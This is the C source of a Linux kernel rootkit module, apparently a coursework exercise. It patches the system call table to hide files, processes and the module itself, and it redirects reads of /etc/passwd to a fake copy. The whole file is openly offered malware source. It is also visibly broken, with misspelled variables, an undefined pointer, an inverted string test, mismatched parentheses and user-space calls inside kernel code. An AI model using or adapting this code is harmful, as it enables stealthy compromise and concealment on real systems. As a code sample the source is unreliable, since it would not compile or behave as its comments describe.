#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/unistd.h>    // for system call constants
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h> // for printk and other kernel bits
#include <linux/module.h> // for all modules
#include <linux/moduleparam.h>
#include <linux/sched.h>

#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
#define SNEAKY_PREFIX "sneaky_process"
#define SNEAKY_PREFIX_SIZE (sizeof(SNEAKY_PREFIX) - 1)
#define SNEAKY_MODULE "sneaky_module"
#define SNEAKY_MODULE_SIZE (sizeof(SNEAKY_MODULE) - 1)
#define REAL_PWD "/etc/passwd"
#define FAKE_PWD "/tmp/passwd"
#define handle_error(msg)                                                      \
  do {                                                                         \
    perror(msg);                                                               \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

struct linux_dirent {
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[1];
};

static char *sneady_pid = "00000000";
module_param(sneaky_pid, charp,
             S_IWUSR | S_IRUSR | S_IXUSR | S_IRGRP | S_IROTH);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Haili Wu");
MODULE_DESCRIPTION("You can not see me.");

void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;

static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;

asmlinkage int (*original_open)(const char *pathname, int flags);
asmlinkage long (*original_getdents)(unsigned int fd,
                                     struct linux_dirent *dirent,
                                     unsigned int count);
asmlinkage int (*original_read)(int fd, void *buf, size_t count);

asmlinkage int sneaky_sys_open(const char *pathname, int flags) {

  printk(KERN_ALERT
         "This guy wants to open /etc/passwd,redirect to /tmp.passwd now...\n");

  if (strcmp(pathname, REAL_PWD)) {
    if (copy_to_user(pathname, FAKE_PWD, sizeof(FAKE_PWD)) != 0) {
      printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user1 \n");
      return -1;
    }
    int ori_value = original_open(pathname, flags);
    if (copy_to_user(pathname, REAL_PWD, sizeof(REAL_PWD) != 0)) {
      printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user2 \n");
      return -1;
    }
  } else {
    return original_open(pathname, flags);
  }
}

asmlinkage long sneaky_sys_getdents(unsigned int fd,
                                    struct linux_dirent *dirent,
                                    unsigned int count) {
  long read_len = original_getdents(fd, dirent, count);
  if (read_len < 0) {
    handle_error("getdents");
    return read_len;
  }

  struct linux_dirent *evil;
  int position;
  char *init = (char *)dirent;
  for (position = 0; position < read_len;) {
    evil = (struct linux_dirent *)(init + position);
    if (strncmp(evil->d_name, SNEAKY_PREFIX, SNEAKY_PREFIX_SIZE) == 0 ||
        strstr(evil->d_name, SNEAKY_MODULE) != NULL ||
        strcmp(evil->dname, sneaky_pid) == 0) ) {

        memcpy(init + position, init + position + evil->d_reclen,
               read_len - (position +
                           evil->d_reclen)); // delete this sub dire/file by
                                             // moving things behind it forward
        evil -= evil->d_reclen;
      }
    else {
      position += evil->d_reclen; // if not sneaky part,comes to next entry
    }
  }
  return read_len;
}

asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
  int ori_value = original_read(fd, buf, count);
  char *sneaky_line = NULL;
  char *sneaky_line_end = NULL;

  // search in buf to see whether SNEAKY_MODULE is inside it
  sneaky_line = strnstr(buf, SNEAKY_MODULE, ori_value);
  if (sneaky_line != NULL) {
    // find SNEAKY_MODULE
    for (sneaky_line_end = sneaky_line; sneaky_line_end < (buf + ori_value);
         sneaky_line_end++) {
      if (*sneaky_line_end == '\n') {
        sneaky_line_end++; // comes to the end of next line
        break;
      }
    }
    // cover the SNEAKY_MODULE line
    memcpy(sneaky_line, sneaky_line_end, (buf + ori_value) - sneaky_line_end);
    // adjust the size of the return buffer's length
    ori_value -= (int)(sneaky_line_end - sneaky_line);
  }

  return ori_value;
}

static int initialize_sneaky_module(void) {
  struct page *page_ptr;

  // See /var/log/syslog for kernel print output
  printk(KERN_ALERT "Sneaky module being loaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is the magic! Save away the original 'open' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_call = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_ALERT "Sneaky module being unloaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
